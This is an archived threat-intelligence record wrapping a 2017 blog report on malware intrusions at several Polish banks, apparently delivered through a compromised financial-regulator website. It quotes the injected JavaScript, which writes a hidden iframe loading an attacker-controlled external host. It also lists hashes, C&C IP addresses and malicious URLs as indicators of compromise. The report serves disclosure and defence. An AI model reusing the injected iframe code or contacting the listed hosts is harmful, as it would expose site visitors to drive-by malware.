{
    "id": "0b109019-dc00-4781-a5e7-d62af449bf12",
    "created_at": "2022-10-25T16:48:22.995302Z",
    "updated_at": "2025-03-27T02:06:02.50618Z",
    "deleted_at": null,
    "sha1_hash": "2b5d73d85ea4173b9fa128f351bfaea0f778e52f",
    "title": "Several Polish banks hacked, information stolen by unknown attackers",
    "authors": "Badcyber",
    "file_creation_date": "2017-02-23T05:16:25Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 341205,
    "plain_text": "# attackers\n\n**badcyber.com/several-polish-banks-hacked-information-stolen-by-unknown-attackers/**\n\nbadcyber 2/3/2017\n\nPolish banks are frantically scanning their workstations and servers while checking logs in the search of signs of\ninfection after some of them noticed unusual network activity and unauthorised files on key machines within their\nnetworks. This is – by far – the most serious information security incident we have seen in Poland.\n\nIt has been a busy week in SOCs all over Polish financial sector. At least a few of Polish 20-something commercial\nbanks have already confirmed being victims of a malware infection while others keep looking. Network traffic to exotic\nlocations and encrypted executables nobody recognised on some servers were the first signs of trouble. A little more\nthan a week ago one of the banks detected strange malware present in a few workstations. Having established basic\nindicators of compromise managed to share that information with other banks, who started asking their SIEMs for\ninformation. In some cases the results came back positive.\n\n## Delivery\n\n\n-----\n\nmodification of one of the local JS files, an external JS file was loaded, which could have executed malicious payloads\non selected targets. This would be really ironic if the website of the key institution responsible for assuring proper\nsecurity level in the banking sector was used to attack it.\n\n\nCurrent website status is “under maintenance”\n\n\n[Data from PassiveTotal does confirm the finding related to external resources included in knf.gov.pl website since](https://www.passivetotal.org/search/www.knf.gov.pl)\n2016-10-07 till yesterday.\n\n\n-----\n\nTo unauthorised code was located in the following file:\n\nhttp://www.knf.gov.pl/DefaultDesign/Layouts/KNF2013/resources/accordian-src.js?ver=11\n\nand looked like that:\n\ndocument.write(\"<div id='efHpTk' width='0px' height='0px'><iframe name='forma'\nsrc='https://sap.misapor\n.ch/vishop/view.jsp?pagenum=1' width='145px' height='146px' style='left:2144px;position:absolute;top\n:0px;'></iframe></div>\");\n\nAfter successful exploitation malware was downloaded to the workstation, where, once executed, connected to some\nforeign servers and could be used to perform network reconnaissance, lateral movement and data exfiltration. At least\nin some cases the attackers managed to gain control over key servers within bank infrastructure.\n\n## Malware\n\nWhile you can find some hashes at the end of this article, we gathered the available information regarding the\nmalware itself. While there might be some elements borrowed from other similar tools and crimeware strategies, the\nmalware used in this attack has not been documented before. It uses some commercial packers and multiple\nobfuscation methods, has multiple stages, relies on encryption and at the moment of initial analysis was not\nrecognised by available AV solutions. The final payload has the functionality of a regular RAT.\n\n## Motivation\n\nWhile we have no idea of attackers motivation, so far we have no knowledge of any direct financial losses incurred by\nbanks or their customers due to this attack. What is more troubling, some of the victims were able to identify large\noutgoing data transfers. So far they could not identify the contents of the data as it was encrypted. Investigation\ncontinues to fully understand the scope of losses.\n\n## Conclusions & IOCs\n\nWhile this should not come as a surprise this incident is the perfect example of the statement “you are going to get\n\n\n-----\n\ndetected and once notified banks were able to quickly identify infected machines and suspicious traffic patterns. The\nwhole process lacked solid information sharing, but this is a problem know everywhere.\n\nWe hope to continue investigating this incident and share with you more details about the malware itself in the future.\nMeanwhile please find attached some IOCs we can share today:\n\n_MD5, SHA1, SHA256 hashes of some samples:_\n\nC1364BBF63B3617B25B58209E4529D8C\n85D316590EDFB4212049C4490DB08C4B\n1BFBC0C9E0D9CEB5C3F4F6CED6BCFEAE\n\n496207DB444203A6A9C02A32AFF28D563999736C\n4F0D7A33D23D53C0EB8B34D102CDD660FC5323A2\nBEDCEAFA2109139C793CB158CEC9FA48F980FF2B\n\nFC8607C155617E09D540C5030EABAD9A9512F656F16B38682FD50B2007583E9B\nD4616F9706403A0D5A2F9A8726230A4693E4C95C58DF5C753CCC684F1D3542E2\nCC6A731E9DAFF84BAE4214603E1C3BAD8D6735B0CBB2A0EC1635B36E6A38CB3A\n\n_Some C&C IP addresses:_\n\n125.214.195.17\n196.29.166.218\n\n_Potentially malicious URLs included in knf.gov.pl website:_\n\nhttp://sap.misapor.ch/vishop/view.jsp?pagenum=1\nhttps://www.eye-watch.in/design/fancybox/Pnf.action\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/7s2s43nlaqxllf4ugef1vyvkm3mr0ryt"
    ],
    "report_names": [
        "Badcyber_Polish-banks-hacked-information-stolen-unknown-attackers(02-03-2017)"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716502,
    "ts_updated_at": 1743041162,
    "ts_creation_date": 1487826985,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/2b5d73d85ea4173b9fa128f351bfaea0f778e52f.pdf",
        "text": "https://archive.orkl.eu/2b5d73d85ea4173b9fa128f351bfaea0f778e52f.txt",
        "img": "https://archive.orkl.eu/2b5d73d85ea4173b9fa128f351bfaea0f778e52f.jpg"
    }
}